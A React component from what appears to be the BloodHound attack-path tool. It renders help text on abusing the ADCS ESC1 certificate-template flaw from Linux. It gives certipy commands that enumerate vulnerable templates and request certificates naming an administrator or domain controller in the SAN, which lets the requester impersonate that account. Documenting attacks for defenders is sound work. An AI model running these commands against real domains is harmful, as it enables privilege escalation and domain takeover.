// Copyright 2023 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import {FC} from 'react';
import {Typography} from '@mui/material';

const LinuxAbuse: FC = () => {
    return (
        <>
            <Typography variant='body2'>
                ADCS ESC-1 allows the principal to impersonate any other principal in the forest by enrolling in a
                template, then using the subsequent certificate to perform NT authentication against a service in the
                domain. An attacker may perform this attack in the following steps:
            </Typography>
            <Typography variant='body2'>
                <b>Step 1</b>: Enumerate and save test, JSON, and bloodhound outputs:
            </Typography>
            <Typography component={'pre'}>
                {
                    "certipy find -u 'user@corp.local' -p 'password' -dc-ip 'DC_IP' -bloodhound"
                }
            </Typography>
            <Typography variant='body2'>
                <b>Step 2</b>: Find vulnerable elements in the output:
            </Typography>
            <Typography component={'pre'}>
                {
                    "certipy find -u 'user@corp.local' -p 'password' -dc-ip 'DC_IP' -vulnerable -stdout"
                }
            </Typography>
            <Typography variant='body2'>
                <b>Step 3</b>: Specify a user account in the SAN:
            </Typography>
            <Typography component={'pre'}>
                {
                    "certipy req -u 'user@corp.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -template 'vulnerable template' -upn 'administrator@corp.local'"
                }
            </Typography>
            <Typography variant='body2'>
                <b>Step 4</b>: Specify a computer account in the SAN:
            </Typography>
            <Typography component={'pre'}>
                {
                    "certipy req -u 'user@contoso.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -template 'vulnerable template' -dns 'dc.corp.local'"
                }
            </Typography>
        </>
    );
};

export default LinuxAbuse;
